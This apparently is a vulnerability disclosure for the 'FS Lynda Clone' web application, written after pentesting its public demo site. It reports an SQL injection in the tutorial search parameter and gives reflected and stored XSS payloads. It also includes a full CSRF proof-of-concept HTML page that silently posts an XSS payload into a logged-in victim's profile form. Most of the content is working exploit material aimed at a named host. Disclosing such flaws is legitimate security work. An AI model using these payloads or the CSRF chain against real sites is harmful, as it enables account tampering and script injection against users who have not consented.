### FS Lynda Clone- the lastest version - SQL Injection/XSS/CSRF

Well,  when I pentest the official demo site of FS Lynda Clone, I found some vulnerabilities here.


#### SQL Injection:

As you can see here, we can obtain the current database user or more sensitive data now!
For example:
```
http://lynda-clone.demonstration.co.in/tutorial/

POST para:
keywords=123
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/sqli.png)


#### XSS:

Here I found some xss, inclue stored-xss and reflect-xss：

##### Reflect-Xss
```
http://lynda-clone.demonstration.co.in/tutorial/

POST：
keywords=123'"><svg/onload=alert(/XSS/)><'"
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/xss2.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/xss1.png)

##### Stored-Xss

It's the user panel here, some fields suffer this bug.
```
http://lynda-clone.demonstration.co.in/user/edit_profile

POST parameters:
Jhon'"><svg/onload=alert(/xss/)><'"
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/xss3.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/FS-Lynda-Clone/xss4.png)

By the way , these xss vulnerabilitys need to be combined with csrf attack.

#### CSRF
There is no csrf protection here.
For example , with the aforementioned stored-xss , we can add a evil content to the user panel:

```
<html>
   <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/lynda-clone.demonstration.co.in\/user\/edit_profile", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryTbB3nj532aSAuKxi");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_first_name\"\r\n" + 
          "\r\n" + 
          "Jhon\'\"\x3e\x3csvg/onload=alert(/xss/)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_last_name\"\r\n" + 
          "\r\n" + 
          "Doe\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_email\"\r\n" + 
          "\r\n" + 
          "user@yourmail.com\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_mobile\"\r\n" + 
          "\r\n" + 
          "9871452630\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_country\"\r\n" + 
          "\r\n" + 
          "India\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_photo\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_photo_name\"\r\n" + 
          "\r\n" + 
          "20170802141220498.jpg\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_about\"\r\n" + 
          "\r\n" + 
          "Maecenas accumsan, massa nec vulputate congue, dolor erat ullamcorper dolor, ac aliquam eros sem in dui. In eu sagittis metus. Proin consectetur suscipit dui sed euismod. Nam non metus in est vehicula vestibulum et vel neque. Mauris scelerisque lectus at diam pretium, eget fringilla erat sollicitudin.Pellentesque quis pharetra tellus. Donec interdum nisi at sem ornare, ut congue felis eleifend. Nam elementum nec leo eget pharetra. Quisque consectetur porta erat sit amet fermentum.\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_social1\"\r\n" + 
          "\r\n" + 
          "##\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_social2\"\r\n" + 
          "\r\n" + 
          "##\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_social3\"\r\n" + 
          "\r\n" + 
          "##\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_social4\"\r\n" + 
          "\r\n" + 
          "##\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile_testimonial\"\r\n" + 
          "\r\n" + 
          "Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus. Phasellus viverra nulla ut metus varius laoreet. \r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi\r\n" + 
          "Content-Disposition: form-data; name=\"edit_profile\"\r\n" + 
          "\r\n" + 
          "Update\r\n" + 
          "------WebKitFormBoundaryTbB3nj532aSAuKxi--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>


```










